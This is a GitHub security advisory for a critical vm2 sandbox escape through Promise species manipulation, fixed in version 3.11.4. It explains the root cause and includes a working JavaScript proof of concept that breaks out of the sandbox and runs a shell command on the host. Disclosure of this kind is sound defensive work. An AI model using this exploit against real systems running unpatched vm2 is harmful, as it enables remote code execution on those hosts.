VM2 suffers from a sandbox breakout vulnerability. This allows attackers to write code which can escape from the VM2 sandbox and execute arbitrary commands on the host system.

### Details

The `localPromise` constructor was changed to call `this.then(undefined, eater)` to ensure a rejected promise is always used. However, this is missing a call to `resetPromiseSpecies` to ensure that `this` has no special species. Since the species can be changed a custom promise can be used to supply a custom reject method to the executor allowing to get a raw host error and escape the sandbox.

### PoC

```js
const {VM} = require("vm2");
const vm = new VM();
vm.run(`
class E extends Error {}
function so(d) {
	if (d > 0) so(d-1);
	const e = new E();
	e.stack;
	throw e;
}
let ex, ct;
class FakePromise extends Promise {
	static get [Symbol.species](){return ct;}
}
function doCatch(f) {
	ex=undefined;
	const p=Promise.withResolvers();
	ct = function(e){e(f, v=>{ex=v;p.resolve();})};
	new FakePromise(r=>r());
	return p.promise;
}
(async function f(s) {
	let min = s;
	let max = 100000;
	while (min<max) {
		const mid = (min+max)>>1;
		await doCatch(()=>so(mid));
		if (ex.name==="RangeError" && !(ex instanceof RangeError)) {
			ex.constructor.constructor("return process")().mainModule.require('child_process').execSync('touch pwned');
			return;
		}
		if (ex instanceof E) {
			min = mid+1;
		} else {
			max = mid;
		}
	}
	f(s+1);
})(0);
`);
```

### Impact

Attackers can perform Remote Code Execution under the assumption that the attacker can run arbitrary code execution inside the context of a vm2 sandbox.", "epss": {"percentage": 0.0051, "percentile": 0.39537}, "ghsa_id": "GHSA-76w7-j9cq-rx2j", "github_reviewed_at": "2026-05-29T17:40:15Z", "html_url": "https://github.com/advisories/GHSA-76w7-j9cq-rx2j", "identifiers": [{"type": "GHSA", "value": "GHSA-76w7-j9cq-rx2j"}, {"type": "CVE", "value": "CVE-2026-47208"}], "nvd_published_at": "2026-06-12T15:16:28Z", "published_at": "2026-05-29T17:40:15Z", "references": ["https://github.com/patriksimek/vm2/security/advisories/GHSA-76w7-j9cq-rx2j", "https://github.com/patriksimek/vm2/commit/a462655009669c3124ee39498121651597529ea8", "https://github.com/patriksimek/vm2/releases/tag/v3.11.4", "https://nvd.nist.gov/vuln/detail/CVE-2026-47208", "https://github.com/advisories/GHSA-76w7-j9cq-rx2j"], "repository_advisory_url": "https://api.github.com/repos/patriksimek/vm2/security-advisories/GHSA-76w7-j9cq-rx2j", "severity": "critical", "source_code_location": "https://github.com/patriksimek/vm2", "summary": "vm2 is Vulnerable to Sandbox Breakout Through Promise Species", "type": "reviewed", "updated_at": "2026-06-12T20:50:55Z", "url": "https://api.github.com/advisories/GHSA-76w7-j9cq-rx2j", "vulnerabilities": [{"first_patched_version": "3.11.4", "package": {"ecosystem": "npm", "name": "vm2"}, "vulnerable_functions": [], "vulnerable_version_range": "<= 3.11.3"}], "withdrawn_at": null}
